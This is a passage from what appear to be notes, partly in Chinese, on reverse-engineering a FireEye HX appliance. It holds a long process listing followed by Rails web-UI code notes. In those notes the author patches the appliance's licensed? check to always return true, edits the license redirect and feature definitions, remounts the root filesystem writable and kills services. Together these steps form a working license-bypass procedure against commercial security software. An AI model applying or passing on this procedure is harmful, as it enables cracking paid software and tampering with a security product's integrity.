t/fireeye/lib/messageBus/jar/kafka/jackson-datatype-jdk8-2.10.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/jackson-module-paranamer-2.10.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/jackson-module-scala_2.12-2.10.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/javassist-3.18.1-GA.jar:/opt/fireeye/lib/messageBus/jar/kafka/javax.annotation-api-1.2.jar:/opt/fireeye/lib/messageBus/jar/kafka/javax.inject-2.4.0-b25.jar:/opt/fireeye/lib/messageBus/jar/kafka/javax.json-1.0.4.jar:/opt/fireeye/lib/messageBus/jar/kafka/javax.ws.rs-api-2.0.1.jar:/opt/fireeye/lib/messageBus/jar/kafka/jersey-client-2.19.jar:/opt/fireeye/lib/messageBus/jar/kafka/jersey-common-2.19.jar:/opt/fireeye/lib/messageBus/jar/kafka/jersey-container-grizzly2-http-2.19.jar:/opt/fireeye/lib/messageBus/jar/kafka/jersey-guava-2.19.jar:/opt/fireeye/lib/messageBus/jar/kafka/jersey-media-jaxb-2.19.jar:/opt/fireeye/lib/messageBus/jar/kafka/jersey-media-json-processing-2.19.jar:/opt/fireeye/lib/messageBus/jar/kafka/jersey-media-multipart-2.19.jar:/opt/fireeye/lib/messageBus/jar/kafka/jersey-server-2.19.jar:/opt/fireeye/lib/messageBus/jar/kafka/jopt-simple-5.0.4.jar:/opt/fireeye/lib/messageBus/jar/kafka/jsonp-jaxrs-1.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/jsr305-3.0.2.jar:/opt/fireeye/lib/messageBus/jar/kafka/junit-3.8.1.jar:/opt/fireeye/lib/messageBus/jar/kafka/kafka-clients-2.3.1.jar:/opt/fireeye/lib/messageBus/jar/kafka/kafka_2.12-2.3.1.jar:/opt/fireeye/lib/messageBus/jar/kafka/log4j-1.2.16.jar:/opt/fireeye/lib/messageBus/jar/kafka/lz4-java-1.6.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/metrics-core-2.2.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/mimepull-1.9.5.jar:/opt/fireeye/lib/messageBus/jar/kafka/osgi-resource-locator-1.0.1.jar:/opt/fireeye/lib/messageBus/jar/kafka/paranamer-2.8.jar:/opt/fireeye/lib/messageBus/jar/kafka/scala-library-2.12.8.jar:/opt/fireeye/lib/messageBus/jar/kafka/scala-logging_2.12-3.9.0.jar:/opt/fireeye/lib/messageBus/jar/kafka/scala-reflect-2.12.8.jar:/opt/fireeye/lib/messageBus/jar/kafka/slf4j-api-1.7.26.jar:/opt/fireeye/lib/messageBus/jar/kafka/spotbugs-annotations-3.1.9.jar:/opt/fireeye/lib/messageBus/jar/kafka/validation-api-1.1.0.Final.jar:/opt/fireeye/lib/messageBus/jar/kafka/zkclient-0.11.jar:/opt/fireeye/lib/messageBus/jar/kafka/zookeeper-3.4.14.jar -Djava.net.preferIPv4Stack=true kafka.Kafka /opt/fireeye/share/messageBus/etc/mb_kafka_server.properties
admin     8365  0.0  0.0   9488  2556 ?        Ss   04:20   0:00 /bin/bash /opt/fireeye/kong/bin/kong.sh
sfserver  8370  0.0  0.1 467508  6252 ?        Ssl  04:20   0:00 /opt/fireeye/bin/sfServer -c /var/opt/tms/output/sf_server_overrides.cfg
hxmsgbus  8371  0.0  0.0   4320   644 ?        S    04:20   0:00 /usr/bin/logger -t kafka
admin     8581  0.0  0.0   9484  2196 ?        S    04:20   0:00 /bin/bash /usr/bin/kong start --conf /opt/fireeye/kong/configs/kong.conf
admin     8599  0.0  0.2  45292  8768 ?        S    04:20   0:00 perl /usr/local/openresty/bin/resty /usr/local/kong/kong.lua start --conf /opt/fireeye/kong/configs/kong.conf
admin     8614  0.0  0.2  70680  9896 ?        S    04:20   0:00 /usr/local/openresty/bin/../nginx/sbin/nginx -p /tmp/hP_WpLGAKS/ -c conf/nginx.conf
admin     8638  0.2  0.3 257552 13820 ?        S    04:20   0:00 nginx: master process /usr/local/openresty/nginx/sbin/nginx -p /data/hx/kong -c nginx.conf
nobody    8694  0.0  0.6 271108 24616 ?        S    04:20   0:00 nginx: worker process
nobody    8695  0.0  0.6 271108 24696 ?        S    04:20   0:00 nginx: worker process
nobody    8696  0.0  0.6 271108 24620 ?        S    04:20   0:00 nginx: worker process
nobody    8697  0.0  0.6 271108 24620 ?        S    04:20   0:00 nginx: worker process
postgres  8698  0.0  0.4 632500 17812 ?        S<s  04:20   0:00 postgres: kong kong 127.0.0.1(46790) idle
postgres  8838  0.0  0.3 631472 14360 ?        S<s  04:20   0:00 postgres: kong kong 127.0.0.1(46818) idle
postgres  8893  0.0  0.4 631472 16116 ?        S<s  04:20   0:00 postgres: kong kong 127.0.0.1(46832) idle
admin     9275  3.1  1.7 668492 67132 ?        Ssl  04:21   0:04 /usr/bin/python3.6 /opt/fireeye/platform_service/app/gunicorn_server.py
admin     9398  0.2  1.4 668492 57872 ?        S    04:21   0:00 /usr/bin/python3.6 /opt/fireeye/platform_service/app/gunicorn_server.py
admin     9400  0.1  1.4 668492 57848 ?        S    04:21   0:00 /usr/bin/python3.6 /opt/fireeye/platform_service/app/gunicorn_server.py
admin     9401  0.2  1.4 668492 57924 ?        S    04:21   0:00 /usr/bin/python3.6 /opt/fireeye/platform_service/app/gunicorn_server.py
admin     9402  0.3  1.4 668492 57988 ?        S    04:21   0:00 /usr/bin/python3.6 /opt/fireeye/platform_service/app/gunicorn_server.py
admin     9860  0.3  0.4 632072 18396 ?        Ssl  04:21   0:00 /opt/fireeye/bin/confd -config-file /opt/fireeye/share/confd/etc/confd.toml -node http://127.0.0.1:2379
hxmsgbus  9861  9.1  3.8 5506636 149536 ?      Ssl  04:21   0:09 /usr/bin/java -Xmx2g -Xms256m -server -Djava.awt.headless=true -Dlog4j.configuration=file:///opt/fireeye/share/messageBus/etc/mb_messagebus_log4j.properties -classpath /opt/fireeye/lib/messageBus/jar/messagebus.jar:/opt/fireeye/java/HXSyslogAppender.jar com.fireeye.hx.messagebus.Server -c /opt/fireeye/share/messageBus/etc/mb_messagebus.properties
hxpki     9863  2.6  1.3 1018212 50444 ?       Ssl  04:21   0:02 /usr/node-6.11/bin/node -nouse-idle-notification /opt/fireeye/lib/pkisvc/node/server.js -c /var/opt/tms/output/pkisvc.json
admin     9867  0.8  0.6 123260 23804 ?        Ss   04:21   0:00 /usr/bin/python3.6 /opt/fireeye/supervisord/bin/supervisord --nodaemon --configuration=/var/opt/tms/output/supervisord.conf
admin     9882  0.0  0.0   4320   636 ?        S    04:21   0:00 /usr/bin/logger -t confd
_HX__tr+  9943  3.6  1.3 1278440 52428 ?       Sl   04:21   0:03 /usr/node-6.11/bin/node /data/hx/plugin_manager/data/pluginPTe2G/triage-trigger-server_1.1.5/src/app.js
admin    10545  0.0  1.2 262988 48152 ?        S    04:21   0:00 /usr/bin/python3.6 /opt/fireeye/api_manager/main.py --mode prod
admin    10546  0.0  1.2 262988 48128 ?        S    04:21   0:00 /usr/bin/python3.6 /opt/fireeye/api_manager/main.py --mode prod
hxapp    10862  4.2  3.1 1057920 123300 ?      Ssl  04:22   0:02 /usr/node-6.11/bin/node -nouse-idle-notification /opt/fireeye/lib/felistener/node/server.js -c /opt/fireeye/share/felistener/etc/felistener.json
sfserver 10863  1.4  0.8 975260 33784 ?        Ssl  04:22   0:00 /usr/node-6.11/bin/node -nouse-idle-notification /opt/fireeye/lib/sfserver/node/certserver.js -config=/opt/fireeye/share/sfserver/etc/sf_cert.json
sfserver 10864  1.9  0.9 943888 38080 ?        Ssl  04:22   0:01 /usr/node-6.11/bin/node -nouse-idle-notification /opt/fireeye/lib/sfserver/node/notifyserver.js -c /opt/fireeye/share/sfserver/etc/sf_notify.json
sfserver 10870  3.0  1.0 1071172 42256 ?       Ssl  04:22   0:01 /usr/node-6.11/bin/node -nouse-idle-notification /opt/fireeye/lib/sfserver/node/provserver.js -config=/opt/fireeye/share/sfserver/etc/sf_provision.json
sfserver 10876  0.9  0.7 1098768 29380 ?       Ssl  04:22   0:00 /usr/node-6.11/bin/node -nouse-idle-notification /opt/fireeye/lib/sfserver/node/provproxy.js -config=/opt/fireeye/share/sfserver/etc/sf_provproxy.json
sftasker 10882 11.4  1.3 1210260 51252 ?       Ssl  04:22   0:06 /usr/node-6.11/bin/node -nouse-idle-notification /opt/fireeye/lib/sftasker/node/sftaskernode.js -config=/opt/fireeye/share/sftasker/etc/config.json
sfserver 10893  2.5  1.1 955036 45664 ?        Ssl  04:22   0:01 /usr/node-6.11/bin/node -nouse-idle-notification /opt/fireeye/lib/sfserver/node/upgradeserver.js -config=/opt/fireeye/share/sfserver/etc/sf_upgrade.json
admin    11076  0.0  0.0   9484  2584 ?        Ss   04:22   0:00 /bin/sh /opt/tms/bin/rsyslog_watcher.sh
webui    11077 17.4  3.0 346156 116568 ?       Ssl  04:22   0:08 ruby /usr/lib/ruby/gems/current/gems/thin-current/bin/thin start -e production -p 5000 -a 127.0.0.1 -r /opt/tms/lib/web/rails/fireeye/script/thinenv.rb -c /opt/tms/lib/web/rails/fireeye
webui    11078 17.1  3.0 346080 116448 ?       Ssl  04:22   0:07 ruby /usr/lib/ruby/gems/current/gems/thin-current/bin/thin start -e production -p 5001 -a 127.0.0.1 -r /opt/tms/lib/web/rails/fireeye/script/thinenv.rb -c /opt/tms/lib/web/rails/fireeye
webui    11081 17.7  3.0 345912 116356 ?       Ssl  04:22   0:08 ruby /usr/lib/ruby/gems/current/gems/thin-current/bin/thin start -e production -p 5002 -a 127.0.0.1 -r /opt/tms/lib/web/rails/fireeye/script/thinenv.rb -c /opt/tms/lib/web/rails/fireeye
hx_cmsd  11092  2.9  0.5 143108 22684 ?        Ss   04:22   0:01 /usr/bin/python /opt/fireeye/fe-java/commons/feJavaLauncher.py
lmsd     11093  0.0  0.2 256968  9816 ?        Ssl  04:22   0:00 /opt/tms/bin/notifyd
lmsd     11094  0.7  0.4 139772 18992 ?        SNs  04:22   0:00 /usr/bin/python /opt/fireeye/streamingd/dsLauncher.py
lmsd     11294  0.2  1.7 612432 69064 ?        SNl  04:22   0:00 /opt/tms/bin/streamplus --foreground -c /data/fenotify/data-streaming/service.conf
hx_cmsd  11327 10.1  1.9 2564372 74600 ?       Sl   04:22   0:04 /usr/bin/java -XX:MetaspaceSize=32m -XX:MaxMetaspaceSize=128m -Xms64m -Xmx1024m -DprofileValue1=V1 -DprofileValue2=V2 -cp ./:/opt/fireeye/fe-java/commons/libraries/plexus-io-2.0.1.jar:/opt/fireeye/fe-java/commons/libraries/plexus-component-annotations-1.5.5.jar:/opt/fireeye/fe-java/commons/libraries/jdom-1.1.jar:/opt/fireeye/fe-java/commons/libraries/jackson-mapper-asl-1.8.5.jar:/opt/fireeye/fe-java/commons/libraries/commons-configuration-1.6.jar:/opt/fireeye/fe-java/commons/libraries/jnr-posix-3.0.27.jar:/opt/fireeye/fe-java/commons/libraries/hibernate-core-4.2.2.Final.jar:/opt/fireeye/fe-java/commons/libraries/persistence-api-1.0.2.jar:/opt/fireeye/fe-java/commons/libraries/tallmaple-2.0.0.jar:/opt/fireeye/fe-java/commons/libraries/plexus-interactivity-api-1.0-alpha-4.jar:/opt/fireeye/fe-java/commons/libraries/ecj-4.4.2.jar:/opt/fireeye/fe-java/commons/libraries/plexus-build-api-0.0.4.jar:/opt/fireeye/fe-java/commons/libraries/commons-dbutils-1.2.jar:/opt/fireeye/fe-java/commons/libraries/commons-pool-1.6.jar:/opt/fireeye/fe-java/commons/libraries/jackson-core-asl-1.8.5.jar:/opt/fireeye/fe-java/commons/libraries/jxl-2.6.10.jar:/opt/fireeye/fe-java/commons/libraries/asm-analysis-5.0.3.jar:/opt/fireeye/fe-java/commons/libraries/jnr-x86asm-1.0.2.jar:/opt/fireeye/fe-java/commons/libraries/com.fireeye.postgresjdbc-9.2.jar:/opt/fireeye/fe-java/commons/libraries/plexus-compiler-api-1.9.1.jar:/opt/fireeye/fe-java/commons/libraries/commons-lang3-3.1.jar:/opt/fireeye/fe-java/commons/libraries/httpcore-4.2.4.jar:/opt/fireeye/fe-java/commons/libraries/commons-logging-1.1.1.jar:/opt/fireeye/fe-java/commons/libraries/json-20151123.jar:/opt/fireeye/fe-java/commons/libraries/jnr-constants-0.9.0.jar:/opt/fireeye/fe-java/commons/libraries/plexus-interpolation-1.13.jar:/opt/fireeye/fe-java/commons/libraries/drools-core-5.6.1-SNAPSHOT.jar:/opt/fireeye/fe-java/commons/libraries/cassandra-driver-core-3.2.0.jar:/opt/fireeye/fe-java/commons/libraries/hibernate-entitymanager-4.2.2.Final.jar:/opt/fireeye/fe-java/commons/libraries/log4j-1.2.17.jar:/opt/fireeye/fe-java/commons/libraries/slf4j-simple-1.7.25.jar:/opt/fireeye/fe-java/commons/libraries/metrics-core-3.1.2.jar:/opt/fireeye/fe-java/commons/libraries/hamcrest-core-1.3.jar:/opt/fireeye/fe-java/commons/libraries/jdependency-0.7.jar:/opt/fireeye/fe-java/commons/libraries/commons-io-2.4.jar:/opt/fireeye/fe-java/commons/libraries/commons-lang-2.6.jar:/opt/fireeye/fe-java/commons/libraries/hibernate-commons-annotations-4.0.2.Final.jar:/opt/fireeye/fe-java/commons/libraries/commons-codec-1.4.jar:/opt/fireeye/fe-java/commons/libraries/commons-beanutils-1.9.3.jar:/opt/fireeye/fe-java/commons/libraries/asm-commons-3.3.1.jar:/opt/fireeye/fe-java/commons/libraries/slf4j-api-1.7.25.jar:/opt/fireeye/fe-java/commons/libraries/commons-cli-1.2.jar:/opt/fireeye/fe-java/commons/libraries/commons-digester-1.8.jar:/opt/fireeye/fe-java/commons/libraries/asm-5.0.3.jar:/opt/fireeye/fe-java/commons/libraries/netty-codec-4.0.44.Final.jar:/opt/fireeye/fe-java/commons/libraries/asm-util-5.0.3.jar:/opt/fireeye/fe-java/commons/libraries/knowledge-internal-api-5.6.1-SNAPSHOT.jar:/opt/fireeye/fe-java/commons/libraries/gson-2.2.4.jar:/opt/fireeye/fe-java/commons/libraries/dom4j-1.6.1.jar:/opt/fireeye/fe-java/commons/libraries/knowledge-api-5.6.1-SNAPSHOT.jar:/opt/fireeye/fe-java/commons/libraries/velocity-1.7.jar:/opt/fireeye/fe-java/commons/libraries/netty-handler-4.0.44.Final.jar:/opt/fireeye/fe-java/commons/libraries/guava-19.0.jar:/opt/fireeye/fe-java/commons/libraries/jboss-transaction-api_1.1_spec-1.0.1.Final.jar:/opt/fireeye/fe-java/commons/libraries/plexus-archiver-2.0.1.jar:/opt/fireeye/fe-java/commons/libraries/netty-buffer-4.0.44.Final.jar:/opt/fireeye/fe-java/commons/libraries/apache-log4j-extras-1.1.jar:/opt/fireeye/fe-java/commons/libraries/mvel2-2.1.8.Final.jar:/opt/fireeye/fe-java/commons/libraries/commons-dbcp-1.4.jar:/opt/fireeye/fe-java/commons/libraries/commons-beanutils-core-1.8.0.jar:/opt/fireeye/fe-java/commons/libraries/hibernate-c3p0-4.2.0.Final.jar:/opt/fireeye/fe-java/commons/libraries/jboss-logging-3.1.0.GA.jar:/opt/fireeye/fe-java/commons/libraries/doxia-sink-api-1.0-alpha-7.jar:/opt/fireeye/fe-java/commons/libraries/junixsocket-1.3.jar:/opt/fireeye/fe-java/commons/libraries/plexus-utils-3.0.jar:/opt/fireeye/fe-java/commons/libraries/netty-common-4.0.44.Final.jar:/opt/fireeye/fe-java/commons/libraries/jnr-ffi-2.0.7.jar:/opt/fireeye/fe-java/commons/libraries/c3p0-0.9.1.jar:/opt/fireeye/fe-java/commons/libraries/drools-compiler-5.6.1-SNAPSHOT.jar:/opt/fireeye/fe-java/commons/libraries/commons-collections-3.2.2.jar:/opt/fireeye/fe-java/commons/libraries/joda-time-2.2.jar:/opt/fireeye/fe-java/commons/libraries/spring-test-3.2.3.RELEASE.jar:/opt/fireeye/fe-java/commons/libraries/asm-tree-5.0.3.jar:/opt/fireeye/fe-java/commons/libraries/netty-transport-4.0.44.Final.jar:/opt/fireeye/fe-java/commons/libraries/httpclient-4.2.5.jar:/opt/fireeye/fe-java/commons/libraries/antlr-2.7.7.jar:/opt/fireeye/fe-java/commons/libraries/antlr-runtime-3.3.jar:/opt/fireeye/fe-java/commons/libraries/plexus-compiler-manager-1.9.1.jar:/opt/fireeye/fe-java/commons/libraries/jffi-1.2.10-native.jar:/opt/fireeye/fe-java/commons/libraries/plexus-compiler-javac-1.9.1.jar:/opt/fireeye/fe-java/commons/libraries/hibernate-jpa-2.0-api-1.0.1.Final.jar:/opt/fireeye/fe-java/commons/libraries/javassist-3.15.0-GA.jar:/opt/fireeye/fe-java/commons/libraries/jffi-1.2.10.jar:/opt/fireeye/fe-java/commons/libraries/asm-commons-5.0.3.jar:/opt/fireeye/fe-java/commons/libraries/api-platform-commons-2.0.0.jar:/opt/fireeye/fe-java/commons/libraries/spring-core-3.2.3.RELEASE.jar:/opt/fireeye/fe-java/commons/libraries/bloom-filter-1.0.7.jar:/opt/fireeye/fe-java/commons/libraries/plexus-digest-1.0.jar:/opt/fireeye/cmsd//cmsd.jar com.fireeye.cms.server.ServerStart
postgres 11355  0.0  0.3 631340 14488 ?        S<s  04:22   0:00 postgres: kong kong 127.0.0.1(47218) idle
postgres 11371  0.1  0.4 632184 17220 ?        S<s  04:22   0:00 postgres: webui lms_db [local] idle
postgres 11372  0.0  0.4 632180 17156 ?        S<s  04:22   0:00 postgres: webui lms_db [local] idle
postgres 11373  0.0  0.4 632180 17252 ?        S<s  04:22   0:00 postgres: webui lms_db [local] idle
aemgr    11377  0.0  0.0   9484  2288 ?        S<s  04:22   0:00 bash /opt/tms/bin/healthmonitord/start
aemgr    11379  1.8  0.7 145024 28408 ?        S<   04:22   0:00 python -m healthmonitord.launcher
aemgr    11421  0.0  0.6 145024 23580 ?        S<   04:22   0:00 python -m healthmonitord.launcher
aemgr    11422  0.0  0.6 145024 24720 ?        S<   04:22   0:00 python -m healthmonitord.launcher
aemgr    11423  0.0  0.6 145024 23580 ?        S<   04:22   0:00 python -m healthmonitord.launcher
aemgr    11424  0.0  0.6 145024 24352 ?        S<   04:22   0:00 python -m healthmonitord.launcher
helixmgr 11445  2.4  0.6 1207564 24624 ?       S<sl 04:22   0:00 python36 /opt/tms/bin/scsd/launcher.py
postgres 11453  0.0  0.2 631208  8728 ?        S<s  04:22   0:00 postgres: fe_services lms_db [local] idle
postgres 11454  0.0  0.2 631208  8784 ?        S<s  04:22   0:00 postgres: helixmgr lighthouse [local] idle
hxapp    11490 53.6  3.5 1329776 137452 ?      Ssl  04:22   0:08 /usr/node-6.11/bin/node -nouse-idle-notification /opt/fireeye/localLighthouse/app_processor/src/app_processor.js
hxapp    11491 29.1  2.7 1036808 105140 ?      Ssl  04:22   0:04 /usr/node-6.11/bin/node -nouse-idle-notification /opt/fireeye/localLighthouse/app_processor/src/app_search_processor.js
hxapp    11492 71.1  4.1 1146848 158896 ?      Ssl  04:22   0:11 /usr/node-6.11/bin/node -nouse-idle-notification /opt/fireeye/localLighthouse/server/app.js
hxapp    11498 49.1  3.2 1053212 125236 ?      Ssl  04:22   0:07 /usr/node-6.11/bin/node -nouse-idle-notification /opt/fireeye/localLighthouse/server/listeners/localListener.js
postgres 11637  0.3  0.4 631480 17568 ?        S<s  04:23   0:00 postgres: hxapp lighthouse [local] idle
postgres 11676  0.0  0.4 631432 15676 ?        S<s  04:23   0:00 postgres: hxapp lighthouse [local] idle
hxapp    11710  3.1  0.6 732016 23508 ?        Sl   04:23   0:00 /usr/node-6.11/bin/node -nouse-idle-notification /opt/fireeye/localLighthouse/app_processor/src/cefLogService.js
hxapp    11775  3.1  0.6 732016 24520 ?        Sl   04:23   0:00 /usr/node-6.11/bin/node -nouse-idle-notification /opt/fireeye/localLighthouse/app_processor/src/cefLogService.js
admin    11824  0.0  0.0   9484  2200 tty1     S    04:23   0:00 sh back.sh
admin    11825  0.1  0.0  11744  3036 tty1     S    04:23   0:00 bash -i
hxapp    11852  6.0  0.6 732016 23684 ?        Sl   04:23   0:00 /usr/node-6.11/bin/node -nouse-idle-notification /opt/fireeye/localLighthouse/app_processor/src/auditLogService.js
postgres 11871  0.2  0.6 634560 24576 ?        S<s  04:23   0:00 postgres: hxapp lighthouse [local] idle
admin    11885  0.0  0.0   4320   728 ?        S    04:23   0:00 sleep 40
postgres 11920  0.0  0.4 631448 16044 ?        S<s  04:23   0:00 postgres: hxapp lighthouse [local] idle
postgres 11921  0.0  0.4 631516 17064 ?        S<s  04:23   0:00 postgres: hxapp lighthouse [local] idle
postgres 11929  0.0  0.4 631536 15716 ?        S<s  04:23   0:00 postgres: hxapp lighthouse [local] idle
hxapp    11957 63.0  0.9 942588 34880 ?        Rsl  04:23   0:00 /usr/node-6.11/bin/node -nouse-idle-notification /opt/fireeye/localLighthouse/policy-service/src/app.js
admin    11958  1.0  0.1  48052  6184 ?        Ss   04:23   0:00 nginx: master process /opt/fireeye/bin/nginx -c /opt/fireeye/wc_server/configs/nginx.cfg -p /data/sts/nginx_wc
admin    11969  0.0  0.0  48520  3092 ?        S    04:23   0:00 nginx: worker process
admin    11970  0.0  0.0  48520  3092 ?        S    04:23   0:00 nginx: worker process
admin    11971  0.0  0.0  48520  3092 ?        S    04:23   0:00 nginx: worker process
admin    11972  0.0  0.0  48520  3060 ?        S    04:23   0:00 nginx: worker process
admin    11973  0.0  0.0  48520  3060 ?        S    04:23   0:00 nginx: worker process
admin    11974  0.0  0.0  48520  2924 ?        S    04:23   0:00 nginx: worker process
admin    11975  0.0  0.0  48520  3088 ?        S    04:23   0:00 nginx: worker process
admin    11976  0.0  0.0  48520  2988 ?        S    04:23   0:00 nginx: worker process
```

### Rails Code

```
rails

##################################################################
/opt/tms/lib/web/rails/fireeye/
app/controllers/application_controller.rb
vi app/controllers/application_controller.rb
redirect_to(:controller => "license", :action => "license")

###########################################################################
## 启动Apache服务
mount -o remount,rw /
cd /etc/httpd/conf.d/
/bin/cp -af ssl.conf.cert ssl.conf
/usr/sbin/httpd -k start
sleep 1
ps aux | grep httpd
/bin/cp -af ssl.conf.ori ssl.conf
ll



##################################################################
def authorize
before_filter :authorize
def authorize_login


##################################################################
def prepare_page
before_filter :prepare_page
fireeye_ng/app/controllers/application_controller.rb


##################################################################
licensed?
fireeye_ng/app/controllers/application_controller.rb:        :is_licensed => Appliance.licensed?,
fireeye_ng/app/controllers/application_controller.rb:    unless Appliance.licensed?

fireeye/app/controllers/login_controller.rb:  def licensed?
fireeye_ng/app/models/base/appliance.rb: def  licensed?
fireeye_ng/app/models/base/appliance.rb:
 def  licensed?
   true_or_false('/license/feature/FIREEYE_APPLIANCE/status/active')
##hhll
   return true
 end
 
 
 
 
##################################################################
 Appliance.product_cms?

fireeye_ng/lib/extensions/appliance_mapper.rb:     if Appliance.product_cms?
class ApplianceMapper
  def self.parent_application_controller
     if Appliance.product_cms?
       Cms::ApplicationController
     elsif Appliance.product_wmps?
       Wmps::ApplicationController
     elsif Appliance.product_emps?
       Emps::ApplicationController
     elsif Appliance.product_fmps?
       Fmps::ApplicationController
     elsif Appliance.product_mas?
       Mas::ApplicationController
     elsif Appliance.product_hx?
       Hx::ApplicationController
     else
       raise "Error!!! unknown appliance"
     end
  end

 
 fireeye_ng/app/models/base/appliance.rb: def product_cms?
  def product_cms?;  FeConstants::PRODUCT_TYPE.eql?(FeConstants::CMS); end
 def product_wmps?; FeConstants::PRODUCT_TYPE.eql?(FeConstants::WMPS); end
 def product_emps?; FeConstants::PRODUCT_TYPE.eql?(FeConstants::EMPS); end
 def product_etp?;  FeConstants::PRODUCT_TYPE.eql?(FeConstants::ETP); end
 def product_fmps?; FeConstants::PRODUCT_TYPE.eql?(FeConstants::FMPS); end
 def product_mas?;  FeConstants::PRODUCT_TYPE.eql?(FeConstants::MAS); end
 def product_hx?;  FeConstants::PRODUCT_TYPE.eql?(FeConstants::HX); end
 def product_vx?;  FeConstants::PRODUCT_TYPE.eql?(FeConstants::VX); end
 
 root :to => "#{FeConstants::PRODUCT_TYPE}/dashboard#index", :via => :get, :fe_allow => [:taag_all_users, :webui_rbac]
 
 Rails.logger.error("hhll===========================")
 
 ps -ef|grep fireeye_ng|grep -v grep|cut -c 9-15|xargs kill -9
 
 
 [admin@fireeye-27caac rails]# grep settings_license * -R
fireeye/lib/feature_definitions.rb:    'settings_license' => {
grep: fireeye/public/flowplayer/ea_traces: No such file or directory
fireeye/app/controllers/license_controller.rb:    if Feature.settings_license.enabled?
fireeye/app/helpers/application_helper.rb:  return true if Feature.settings_license.enabled? and action_name.eql?("license")
fireeye_ng/lib/feature_definitions.rb:    'settings_license' => {
fireeye_ng/config/initializers/fe_init.rb:if Feature.settings_license.enabled?
[admin@fireeye-27caac rails]# vi fireeye/lib/feature_definitions.rb


##################################################################
日志:tailf /var/log/lms_production.log

 Filter chain halted as :prepare_page rendered or redirected
 Completed 203 Non-Authoritative Information in 51.7ms (Views: 0.2ms | ActiveRecord: 0.0ms)
] Filter chain halted as :prepare_page rendered or redirected
] Completed 203 Non-Authoritative Information in 20.7ms (Views: 0.1ms | ActiveRecord: 0.0ms)
 Filter chain halted as :prepare_page rendered or redirected
 Completed 203 Non-Authoritative Information in 44.1ms (Views: 0.7ms | ActiveRecord: 0.0ms)

https://192.168.88.130:3000/license/license

https://192.168.88.130:3000/hx_ng/settings/licenses

taag_licenses
```